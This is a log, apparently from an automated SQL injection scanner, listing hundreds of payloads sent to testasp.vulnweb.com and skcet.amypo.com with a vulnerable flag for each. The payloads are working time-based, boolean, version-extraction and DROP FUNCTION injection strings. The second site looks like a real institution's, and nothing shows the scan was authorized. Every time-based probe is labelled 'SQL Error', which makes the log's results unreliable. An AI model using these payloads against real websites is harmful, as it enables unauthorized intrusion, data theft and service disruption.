URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: https://skcet.amypo.com/, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: +benchmark(3200,SHA1(1))+', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: +benchmark(3200,SHA1(1))+', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: + SLEEP(10) + ', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: + SLEEP(10) + ', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: +benchmark(3200,SHA1(1))+', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: pg_SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: +benchmark(3200,SHA1(1))+', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RANDOMBLOB(500000000/2), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RANDOMBLOB(500000000/2), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: + SLEEP(10) + ', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '|| pg_sleep(10) --+, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: pg_SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: + SLEEP(10) + ', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RANDOMBLOB(500000000/2), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: pg_SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RANDOMBLOB(500000000/2), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or pg_SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RANDOMBLOB(1000000000/2), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or pg_SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RANDOMBLOB(1000000000/2), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RANDOMBLOB(1000000000/2), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or pg_SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RANDOMBLOB(1000000000/2), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '\", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AnD SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '|| pg_sleep(10) --+, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AnD SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '|| pg_sleep(10) --+, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AnD SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '|| pg_sleep(10) --+, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '|| pg_sleep(10) --+, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: &&SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: &&SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: &&SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' AnD SLEEP(5) ANd '1, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '&&SLEEP(5)&&'1, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: +benchmark(3200,SHA1(1))+', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: + SLEEP(10) + ', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RANDOMBLOB(500000000/2), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RANDOMBLOB(1000000000/2), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '|| pg_sleep(10) --+, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: https://skcet.amypo.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY 31337, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8310 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8311 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='M', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='i', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='y', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='c', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='S', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1 or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ") or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ') or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1)) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ")) or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ')) or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ;waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: );waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ';waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ";waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: "));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1 or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ") or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ') or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1)) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ")) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ')) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1 or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ") or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ') or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1)) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ")) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ')) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: waitfor delay '00:00:05', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: waitfor delay '00:00:05'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: waitfor delay '00:00:05'#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: pg_SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: pg_SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: pg_SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or pg_SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or pg_SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: or pg_SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '\", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AnD SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AnD SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AnD SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: &&SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: &&SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: &&SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' AnD SLEEP(5) ANd '1, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '&&SLEEP(5)&&'1, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: +benchmark(3200,SHA1(1))+', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: + SLEEP(10) + ', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RANDOMBLOB(500000000/2), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RANDOMBLOB(1000000000/2), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '|| pg_sleep(10) --+, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
